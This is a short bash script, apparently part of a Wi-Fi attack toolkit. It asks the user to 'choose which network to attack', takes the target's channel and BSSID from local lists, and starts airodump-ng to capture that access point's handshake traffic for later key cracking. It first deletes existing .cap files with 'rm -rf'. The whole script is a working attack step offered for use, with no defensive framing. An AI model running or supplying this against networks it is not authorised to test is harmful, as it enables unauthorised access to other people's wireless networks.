#!/bin/bash

rm -rf *.cap

echo "Choose which network to attack."
cat network-list.txt

read -r input

ssid=$(awk -v pat="$input" -F ":" '$0~pat{print $2}' network-list.txt)

awk -v pat="$ssid" -F" " '$0~pat{print $2" "$3}' networks.txt > combined.txt
interface=$(cat interfaceToUse.txt)
targetChannel=$(awk -F " " 'FNR<2{print $2}' combined.txt)
targetBSSID=$(awk -F " " 'FNR<2{print $1}' combined.txt)

airodump-ng -c $targetChannel --bssid $targetBSSID -w psk $interface
